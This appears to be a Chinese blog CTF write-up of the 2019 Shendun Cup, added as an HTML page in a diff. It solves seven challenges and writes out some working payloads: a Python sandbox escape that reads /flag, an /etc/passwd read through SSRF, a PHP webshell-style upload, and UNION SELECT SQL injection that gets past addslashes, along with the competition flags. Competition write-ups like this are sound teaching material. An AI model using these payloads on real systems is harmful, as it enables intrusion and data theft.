@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>2019神盾杯 :: Ca1s1&#39;Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="首届“神盾杯”上海市网络安全竞赛，去年的比赛。
+0x00 babyJS 操作内容：
+查看源码 找不到被调用的CheckLogin函数
+看到script中有用到unespace和escape等函数 用于编码字符串
+将eval传参改为alert 显示为弹窗
+发现check函数 并将flag与用户输入做比较 得到flag
+FLAG值：
+flag{a5a5f402f6dc62acd3e848900a17513f}
+0x01 crypto_easy_1 操作内容：
+下载文件
+发现3行类似的数据 并且长度一致。
+:左边的长度为42 右边的长度为56 ，猜测右边被base64编码过 进行解码 比较长度
+长度一致 为42
+异或运算一下 可以得到Key随后将key代入 与base64解码后的密文异或比较 得到flag
+解密脚本如下:
+import base64 x = &#39;v6&#34;wo5UIP9c4IdCk1o6qZhhB5DKZhVBwBzONl1JRIz:TwB2RyZYBCEVbjBjID17UkUeeDAwPBh1dg86AyAgcSQ4QygYGnAuJQYw&#39; y = &#39;zjS0ubQE2hw29FL2qs61ZNOVyFaf6IAjUZ7X8ijuVg:Q1wHADwPAC13PyRlUB90CwUCeHAwGj9hOg0QP34/cjkvY1AOTigOAhkt&#39; z = &#39;pJryZpVUNpSFi06WlKGkS0Uka6zw1sNCX&#34;h2urQoyg:SXwmSRMdBz0LJwARAGkObhg6CSo5ZCVcIn0LLnkFfRAiGw9kAzM1GDYt&#39; a, b = x.split(&#39;:&#39;) c, d = y.split(&#39;:&#39;) e, f = z.split(&#39;:&#39;) b = base64.b64decode(b) d = base64.b64decode(d) f = base64.b64decode(f) g = base64.b64decode(&#39;X1o1VzIPaVgjbmNvCnQAC0ZHY3BbMUkaeylDYWVOCzZDXwJjR3hTFiw3&#39;) flag = &#39;&#39; for i in range(42): t = ord(a[i]) ^ ord(b[i]) flag &#43;= chr(ord(g[i]) ^ t) print(flag) FLAG值：
+" />
+<meta name="keywords" content="ctf, 神盾杯" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://vuln.top/posts/2019shendun/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://vuln.top/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://vuln.top/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://vuln.top/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="2019神盾杯">
+<meta property="og:description" content="首届“神盾杯”上海市网络安全竞赛，去年的比赛。
+0x00 babyJS 操作内容：
+查看源码 找不到被调用的CheckLogin函数
+看到script中有用到unespace和escape等函数 用于编码字符串
+将eval传参改为alert 显示为弹窗
+发现check函数 并将flag与用户输入做比较 得到flag
+FLAG值：
+flag{a5a5f402f6dc62acd3e848900a17513f}
+0x01 crypto_easy_1 操作内容：
+下载文件
+发现3行类似的数据 并且长度一致。
+:左边的长度为42 右边的长度为56 ，猜测右边被base64编码过 进行解码 比较长度
+长度一致 为42
+异或运算一下 可以得到Key随后将key代入 与base64解码后的密文异或比较 得到flag
+解密脚本如下:
+import base64 x = &#39;v6&#34;wo5UIP9c4IdCk1o6qZhhB5DKZhVBwBzONl1JRIz:TwB2RyZYBCEVbjBjID17UkUeeDAwPBh1dg86AyAgcSQ4QygYGnAuJQYw&#39; y = &#39;zjS0ubQE2hw29FL2qs61ZNOVyFaf6IAjUZ7X8ijuVg:Q1wHADwPAC13PyRlUB90CwUCeHAwGj9hOg0QP34/cjkvY1AOTigOAhkt&#39; z = &#39;pJryZpVUNpSFi06WlKGkS0Uka6zw1sNCX&#34;h2urQoyg:SXwmSRMdBz0LJwARAGkObhg6CSo5ZCVcIn0LLnkFfRAiGw9kAzM1GDYt&#39; a, b = x.split(&#39;:&#39;) c, d = y.split(&#39;:&#39;) e, f = z.split(&#39;:&#39;) b = base64.b64decode(b) d = base64.b64decode(d) f = base64.b64decode(f) g = base64.b64decode(&#39;X1o1VzIPaVgjbmNvCnQAC0ZHY3BbMUkaeylDYWVOCzZDXwJjR3hTFiw3&#39;) flag = &#39;&#39; for i in range(42): t = ord(a[i]) ^ ord(b[i]) flag &#43;= chr(ord(g[i]) ^ t) print(flag) FLAG值：
+" />
+<meta property="og:url" content="https://vuln.top/posts/2019shendun/" />
+<meta property="og:site_name" content="Ca1s1&#39;Blog" />
+
+  
+  
+  <meta property="og:image" content="https://vuln.top/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2020-08-23 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://vuln.top/">
+  <div class="logo">
+    Ca1s1'Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/">about</a></li>
+        
+      
+        
+          <li><a href="/link/">link</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/" >about</a></li>
+        
+      
+        
+          <li><a href="/link/" >link</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://vuln.top/posts/2019shendun/">2019神盾杯</a>
+  </h1>
+  <div class="post-meta">
+    
+      <time class="post-date">
+        2020-08-23 ::
+        
+      </time>
+    
+    
+      <span class="post-author">Ca1s1</span>
+    
+    
+      <span class="post-reading-time">:: 1 min read (168 words)</span>
+    
+  </div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+      
+      #<a href="https://vuln.top/tags/php/">php</a>&nbsp;
+      
+      #<a href="https://vuln.top/tags/js/">js</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p><strong>首届“神盾杯”上海市网络安全竞赛</strong>，去年的比赛。</p>
+<h1 id="0x00-babyjs">0x00 babyJS<a href="#0x00-babyjs" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><strong>操作内容：</strong></p>
+<p>查看源码 找不到被调用的<code>CheckLogin</code>函数</p>
+<p><img src="/img/19shendun///image1.png" alt="/img/19shendun/image1.png"></p>
+<p>看到<strong>script</strong>中有用到<code>unespace</code>和<code>escape</code>等函数 用于编码字符串</p>
+<p>将<code>eval</code>传参改为<code>alert</code> 显示为弹窗</p>
+<p><img src="/img/19shendun/image2.png" alt="/img/19shendun/image2.png"></p>
+<p>发现<code>check</code>函数 并将flag与用户输入做比较 得到flag</p>
+<p><img src="/img/19shendun/image3.png" alt="/img/19shendun/image3.png"></p>
+<p><strong>FLAG值：</strong></p>
+<p><strong>flag{a5a5f402f6dc62acd3e848900a17513f}</strong></p>
+<h1 id="0x01-crypto_easy_1">0x01 crypto_easy_1<a href="#0x01-crypto_easy_1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><strong>操作内容：</strong></p>
+<p>下载文件</p>
+<p><img src="/img/19shendun/image4.png" alt="/img/19shendun/image4.png"></p>
+<p>发现3行类似的数据 并且长度一致。</p>
+<p>:左边的长度为42 右边的长度为56 ，猜测右边被base64编码过 进行解码 比较长度</p>
+<p><img src="/img/19shendun/image5.png" alt="/img/19shendun/image5.png"></p>
+<p>长度一致 为42</p>
+<p>异或运算一下 可以得到Key随后将key代入 与base64解码后的密文异或比较 得到flag</p>
+<p>解密脚本如下:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>x <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;v6&#34;wo5UIP9c4IdCk1o6qZhhB5DKZhVBwBzONl1JRIz:TwB2RyZYBCEVbjBjID17UkUeeDAwPBh1dg86AyAgcSQ4QygYGnAuJQYw&#39;</span>
+</span></span><span style="display:flex;"><span>y <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;zjS0ubQE2hw29FL2qs61ZNOVyFaf6IAjUZ7X8ijuVg:Q1wHADwPAC13PyRlUB90CwUCeHAwGj9hOg0QP34/cjkvY1AOTigOAhkt&#39;</span>
+</span></span><span style="display:flex;"><span>z <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;pJryZpVUNpSFi06WlKGkS0Uka6zw1sNCX&#34;h2urQoyg:SXwmSRMdBz0LJwARAGkObhg6CSo5ZCVcIn0LLnkFfRAiGw9kAzM1GDYt&#39;</span>
+</span></span><span style="display:flex;"><span>a, b <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>c, d <span style="color:#f92672">=</span> y<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>e, f <span style="color:#f92672">=</span> z<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(b)
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(d)
+</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(f)
+</span></span><span style="display:flex;"><span>g <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#39;X1o1VzIPaVgjbmNvCnQAC0ZHY3BbMUkaeylDYWVOCzZDXwJjR3hTFiw3&#39;</span>)
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>  i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">42</span>):
+</span></span><span style="display:flex;"><span>    t <span style="color:#f92672">=</span> ord(a[i]) <span style="color:#f92672">^</span> ord(b[i])
+</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">+=</span> chr(ord(g[i]) <span style="color:#f92672">^</span> t)
+</span></span><span style="display:flex;"><span>print(flag)
+</span></span></code></pre></div><p><strong>FLAG值：</strong></p>
+<p><strong>flag{b80f908c-8226-11e9-8b28-88e9fe5197ac}</strong></p>
+<h1 id="0x02-ez_gallery_1">0x02 ez_gallery_1<a href="#0x02-ez_gallery_1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><strong>操作内容：</strong></p>
+<p>查看源码</p>
+<p>提示flag位置</p>
+<p><img src="/img/19shendun/image6.png" alt="/img/19shendun/image6.png"></p>
+<p>找到可以利用的url</p>
+<p><img src="/img/19shendun/image7.png" alt="/img/19shendun/image7.png"></p>
+<p>使用?截断1.jpg</p>
+<p><img src="/img/19shendun/image8.png" alt="/img/19shendun/image8.png"></p>
+<p><strong>FLAG值：</strong></p>
+<p><strong>flag{378346c7ac53d624a8621efc745bbeab}</strong></p>
+<p><strong>0x03 fast_calc_2</strong></p>
+<p><strong>操作内容：</strong></p>
+<p>随便试了几下{1+1},{set},发现有点奇怪,猜测可能是python逃逸</p>
+<p>尝试<code>dir(().__class__)</code></p>
+<p><img src="/img/19shendun/image9.png" alt="/img/19shendun/image9.png"></p>
+<p>尝试了一下网上的payload但是没有成功，发现存在过滤，过滤了<code>[]</code></p>
+<p>查到builtins是自动引入环境的<code>__builtins__.__dict__</code></p>
+<p><img src="/img/19shendun/image10.png" alt="/img/19shendun/image10.png"></p>
+<p>查找资料通过pop绕过[]</p>
+<p><img src="/img/19shendun/image11.png" alt="/img/19shendun/image11.png"></p>
+<p>Payload为：<code>__builtins__.__dict__.pop('open')('/flag').readline()</code></p>
+<p><img src="/img/19shendun/image12.png" alt="/img/19shendun/image12.png"></p>
+<p><strong>FLAG值：</strong></p>
+<p><strong>flag{4582900a19a6a8801399afb6a31d9bc0}</strong></p>
+<h1 id="0x04-easyadmin">0x04 Easyadmin<a href="#0x04-easyadmin" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><strong>操作内容：</strong></p>
+<p>爆破下目录发现index.php~存在源码</p>
+<p><img src="/img/19shendun/image13.png" alt="/img/19shendun/image13.png"></p>
+<p>发现srole==admin才能输出flag</p>
+<p><img src="/img/19shendun/image14.png" alt="/img/19shendun/image14.png"></p>
+<p>登陆的后发现token为base64加密，解一下</p>
+<p><img src="/img/19shendun/image15.png" alt="/img/19shendun/image15.png"></p>
+<p><img src="/img/19shendun/image16.png" alt="/img/19shendun/image16.png"></p>
+<p>搜索了一下jwt发现有加密，网上有类似的解法</p>
+<p>下面网站可以验证</p>
+<p><a href="https://jwt.io/">https://jwt.io/</a></p>
+<p><img src="/img/19shendun/image17.png" alt="/img/19shendun/image17.png"></p>
+<p>有根据源码把guest改为admin</p>
+<p>再看下源码，里面有一个key我们不知道，猜测需要爆破应该为4位</p>
+<p><img src="/img/19shendun/image18.png" alt="/img/19shendun/image18.png"></p>
+<p>在github上找到一个脚本直接跑出来了<a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
+<p><img src="/img/19shendun/image19.png" alt="/img/19shendun/image19.png"></p>
+<p>保存下‘sjwt’</p>
+<p><img src="/img/19shendun/image20.png" alt="/img/19shendun/image20.png"></p>
+<p>用这个新token替换一下成功获取flag</p>
+<p><img src="/img/19shendun/image21.png" alt="/img/19shendun/image21.png"></p>
+<p><strong>FLAG值：</strong></p>
+<p><strong>flag{11529a36dd607c45e5b104ed977247ed}</strong></p>
+<h1 id="0x05-easyupload">0x05 Easyupload<a href="#0x05-easyupload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><strong>操作内容：</strong></p>
+<p>通过尝试发现在图片地址处输入 <a href="">file:///etc/passwd</a>可以读到文件</p>
+<p><img src="/img/19shendun/image22.png" alt="/img/19shendun/image22.png"></p>
+<p><img src="/img/19shendun/image23.png" alt="/img/19shendun/image23.png"></p>
+<p>然后在这卡了好久，在摸索后发现可以通过用/proc/self/cwd绕过，cwd是一个符号链接，指向了实际的工作目录</p>
+<p>下图是一篇文章中的介绍</p>
+<p><img src="/img/19shendun/image24.png" alt="/img/19shendun/image24.png"></p>
+<p><img src="/img/19shendun/image25.png" alt="/img/19shendun/image25.png"></p>
+<p>构造如下payload</p>
+<p><img src="/img/19shendun/image26.png" alt="/img/19shendun/image26.png"></p>
+<p>获取到源码</p>
+<p><img src="/img/19shendun/image27.png" alt="/img/19shendun/image27.png"></p>
+<p>找到他的命名规则</p>
+<p><img src="/img/19shendun/image28.png" alt="/img/19shendun/image28.png"></p>
+<p>然后通过上传php webshell获取flag</p>
+<p>先上传一个phpinfo</p>
+<p><img src="/img/19shendun/image29.png" alt="/img/19shendun/image29.png"></p>
+<p>读到了文件但是没有执行</p>
+<p><img src="/img/19shendun/image30.png" alt="/img/19shendun/image30.png"></p>
+<p>想到通过</p>
+<p><img src="/img/19shendun/image31.png" alt="/img/19shendun/image31.png"></p>
+<p><code>&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;</code></p>
+<p><img src="/img/19shendun/image32.png" alt="/img/19shendun/image32.png"></p>
+<p>成功执行</p>
+<p>运行 <code>system(cat /flag)</code></p>
+<p><img src="/img/19shendun/image33.png" alt="/img/19shendun/image33.png"></p>
+<p><img src="/img/19shendun/image34.png" alt="/img/19shendun/image34.png"></p>
+<p><strong>FLAG值：</strong></p>
+<p><strong>flag{2742ab5468a78d70dca332ca48aa7b89}</strong></p>
+<h1 id="0x06-easysqli">0x06 Easysqli<a href="#0x06-easysqli" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><strong>操作内容：</strong></p>
+<p>首先登陆pow直接在cmd5上解密下就行</p>
+<p><img src="/img/19shendun/image35.png" alt="/img/19shendun/image35.png"></p>
+<p>一开始尝试各种绕过都不行</p>
+<p><img src="/img/19shendun/image36.png" alt="/img/19shendun/image36.png"></p>
+<p>后来提示了一波<code>bypass addslashes</code></p>
+<p>通过google搜索</p>
+<p><img src="/img/19shendun/image37.png" alt="/img/19shendun/image37.png"></p>
+<p>格式化字符串漏洞</p>
+<p><img src="/img/19shendun/image38.png" alt="/img/19shendun/image38.png"></p>
+<p>找到payload %1$'</p>
+<p>1．两张 <code>admin%1$'%20union%20select%201,2%23</code></p>
+<p><img src="/img/19shendun/image39.png" alt="/img/19shendun/image39.png"></p>
+<ol start="2">
+<li>查找表<code>admin%1$'%20union%20select%20table_name,2%20from%20information_schema.tables%20where%20table_schema=database()%23</code></li>
+</ol>
+<p>表名user</p>
+<p><img src="/img/19shendun/image40.png" alt="/img/19shendun/image40.png"></p>
+<ol start="3">
+<li><code>admin%1$'%20union%20select%20column_name,2%20from%20information_schema.columns%20where%20table_schema=database()%23</code></li>
+</ol>
+<p>找到字段名</p>
+<p><img src="/img/19shendun/image41.png" alt="/img/19shendun/image41.png"></p>
+<ol start="4">
+<li><code>admin%1$'%20union%20select%20username,password%20from%20user%23</code></li>
+</ol>
+<p>在password中找到<strong>flag</strong></p>
+<p><img src="/img/19shendun/image42.png" alt="/img/19shendun/image42.png"></p>
+<p><strong>FLAG值：</strong></p>
+<p><strong>flag{299386fb699cff0cb99b1f57dee500a0}</strong></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h"></span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://vuln.top/posts/ctfneiwang/">
+                <span class="button__icon">←</span>
+                <span class="button__text">CTF内网渗透题</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://vuln.top/posts/burpjsencrypt/">
+                <span class="button__text">jsEncrypter 加密</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
